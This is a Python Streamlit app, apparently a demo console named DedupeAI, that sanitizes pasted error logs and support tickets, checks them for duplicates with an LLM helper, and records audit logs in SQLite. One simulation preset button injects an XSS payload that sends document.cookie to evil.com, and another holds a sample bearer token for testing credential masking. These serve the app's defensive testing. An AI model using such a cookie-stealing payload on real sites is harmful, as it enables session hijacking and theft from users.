import streamlit as st
import pandas as pd
import os
import sqlite3
import plotly.express as px
from datetime import datetime
from src.processor import TicketProcessor
from src.llm_helper import LLMDeduplicatorHelper
from src.cache import RedisSimulationCache

# Configure page visibility constraints
st.set_page_config(page_title="DedupeAI Enterprise Console", layout="wide")

# Initialize infrastructure components inside session memory state
if "processor" not in st.session_state:
    st.session_state.processor = TicketProcessor()
if "ai_helper" not in st.session_state:
    st.session_state.ai_helper = LLMDeduplicatorHelper()
if "redis_cache" not in st.session_state:
    st.session_state.redis_cache = RedisSimulationCache(ttl_seconds=30)

proc = st.session_state.processor
ai_helper = st.session_state.ai_helper
cache = st.session_state.redis_cache

# Ensure base records are active
proc.seed_historical_baseline()

st.title("🛡️ DedupeAI — Upgraded Fullstack Security Cockpit")
st.markdown("---")

col_left, col_right = st.columns([2, 3])

with col_left:
    st.subheader("📥 Secure Incident Intake Channel")
    st.markdown("---")
    
    # Premium Simulation Packages
    st.markdown("**Incident Inject Simulation Presets:**")
    b1, b2, b3 = st.columns(3)
    preset_text = ""
    with b1:
        if st.button("Database Connection Pool"):
            preset_text = "FATAL ERROR: Remaining connection slots are fully exhausted for active superusers. API latency spiking."
    with b2:
        if st.button("XSS Script Inject Attack"):
            preset_text = "<script>window.location='http://evil.com/steal?cookie='+document.cookie</script> Login page validation error."
    with b3:
        if st.button("Leaked API Authorization Key"):
            preset_text = "Cron framework crash logs reporting failure using master credentials: BEARER_TOKEN=AIzaSyB9X8Y7Z6W5V4U3T2S1R0Q9P8O7N6M5"

    input_text = st.text_area(
        "Paste System Error Log / Support Ticket:",
        value=preset_text if preset_text else "",
        height=180,
        placeholder="Logs pasted here are automatically checked for hidden credentials and injection strings..."
    )
    
    fire_analysis = st.button("Execute Secure Triage Loop", type="primary")

with col_right:
    st.subheader("📊 Triage Performance & Security Analytics")
    st.markdown("---")
    
    if fire_analysis and input_text.strip():
        # Defensive Control Wrapper: Hide Internal Errors from breaking to clients
        try:
            # 1. Enforce background protection checks (Sanitization & Sensitive Data Masking)
            cleaned_input = proc.sanitize_and_mask_input(input_text)
            
            st.info(f"🔒 **Sanitized Engine Stream Input View:**\n`{cleaned_input}`")
            
            # Generate a secure execution fingerprint hash key for the Redis memory cache tier
            cache_key = f"verdict:{hash(cleaned_input)}"
            
            # 2. Check low-latency memory caching tier first to protect throughput
            cached_verdict = cache.get(cache_key)
            
            if cached_verdict:
                ai_verdict = cached_verdict
                st.caption("⚡ *Performance Metric: Low-Latency Memory Cache Hit! Retaining API units.*")
                proc.log_security_event("CACHE_PERIMETER_HIT", "SUCCESS", {"key": cache_key})
            else:
                # Cache Miss: Execute the full matching pipelines
                matches = proc.find_top_matches(cleaned_input, top_n=3)
                ai_verdict = ai_helper.verify_duplicate_status(cleaned_input, matches)
                
                # Commit response payload to the cache tier
                cache.set(cache_key, ai_verdict)
                proc.log_security_event("CACHE_PERIMETER_MISS", "PROCESSED", {"key": cache_key})

            # 3. Dynamic UI interpretation based on cognitive gate values
            is_dup = False
            for key in ["is_duplicate", "isDuplicate", "IS_DUPLICATE"]:
                if key in ai_verdict:
                    is_dup = bool(ai_verdict[key])

            confidence = ai_verdict.get("confidence_percentage", 0)
            reasoning = ai_verdict.get("reasoning", "Verification complete.")
            action = ai_verdict.get("recommended_action", "Review ticket parameters manually.")
            target_id = ai_verdict.get("target_duplicate_id", None)

            if is_dup:
                st.error(f"🚨 DUPLICATE DETECTED (Confidence Score Match: {confidence}%)")
                st.markdown(f"**Action Required:** `{action}`")
                st.markdown(f"**Technical Comparison Summary:** *{reasoning}*")
                proc.log_security_event("INCIDENT_TRIAGE_VERDICT", "DUPLICATE_FOUND", {"linked_to": target_id})
            else:
                st.success("✅ UNIQUE STANDALONE TICKET VERIFIED (Saved to Data Matrix)")
                st.markdown(f"**Action Required:** `Route to assigned department queue.`")
                st.markdown(f"**Technical Comparison Summary:** *{reasoning}*")
                
                # Dynamic Learning: Save unique record directly back into relational table arrays
                new_id = f"TS-DYN-{int(datetime.now().timestamp())}"
                try:
                    conn = sqlite3.connect(proc.db_path)
                    cursor = conn.cursor()
                    cursor.execute(
                        "INSERT INTO historical_tickets VALUES (?, ?, ?, ?, ?)",
                        (new_id, "Application", cleaned_input[:40] + "...", cleaned_input, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                    )
                    conn.commit()
                    conn.close()
                    proc.log_security_event("DATABASE_DYNAMIC_LEARN", "SUCCESS", {"inserted_id": new_id})
                except Exception:
                    pass

            # 4. Render Plotly Horizontal Similarity engine chart spectrum
            fresh_matches = proc.find_top_matches(cleaned_input, top_n=3)
            if fresh_matches:
                st.markdown("---")
                st.markdown("**Local Math Overlap Spectrum Map:**")
                chart_df = pd.DataFrame(fresh_matches)
                fig = px.bar(
                    chart_df,
                    x="similarity_score",
                    y="ticket_id",
                    orientation="h",
                    color="similarity_score",
                    color_continuous_scale="Reds",
                    labels={"similarity_score": "Cosine Overlap Score", "ticket_id": "Row Entity ID"}
                )
                fig.update_layout(height=170, margin=dict(l=10, r=10, t=10, b=10), template="plotly_dark")
                st.plotly_chart(fig, use_container_width=True)

        except Exception as system_exception:
            # Hide Internal Errors: Suppress python traceback metrics from the user view
            st.error("⚠️ An internal infrastructure exception occurred while triaging this log record. Stack trace details have been shielded.")
            proc.log_security_event("SYSTEM_CORE_ERROR", "FAILURE", {"details": str(system_exception)})

    elif fire_analysis:
        st.warning("Please input a valid text string to run triage.")
    else:
        st.caption("Operational cockpit status: Idle. Click a simulation preset to launch.")

# Bottom Panel Dashboard: Real-Time Security Audit Logs Grid View
st.markdown("---")
st.subheader("📋 Operational Security Audit Stream (Real-Time SQLite Logs)")
audit_logs_df = proc.fetch_audit_logs()
if not audit_logs_df.empty:
    st.dataframe(audit_logs_df, use_container_width=True, hide_index=True)
else:
    st.caption("No auditable transaction records currently found in session memory.")